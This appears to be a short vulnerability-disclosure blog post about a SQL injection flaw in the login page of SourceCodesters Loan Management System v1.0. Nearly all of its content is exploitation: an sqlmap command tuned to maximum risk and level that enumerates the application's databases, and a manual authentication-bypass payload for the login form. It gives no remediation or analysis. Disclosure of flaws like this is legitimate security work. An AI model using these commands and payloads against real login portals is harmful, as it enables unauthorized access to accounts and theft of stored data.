---
layout: post
title: 
tags: [CVE, SQL injection]
description: "SQL injection vulnerability in 'login.php' login-portal webpage of SourceCodesters Loan Management System v1.0"
---

## SQL Injection

SQL injection vulnerability in 'login.php' login-portal webpage of SourceCodesters Loan Management System v1.0

### Exploitation :

#### With SQLMAP

```
sqlmap -u "http://localhost/loan/ajax.php?action=login" --method POST --data "username=test&password=test" --dbms=MySQL --risk 3 --level 5 --batch -v 3 --dbs
```

#### Manually

```
admin'or '1'='1--
```





*More information to come*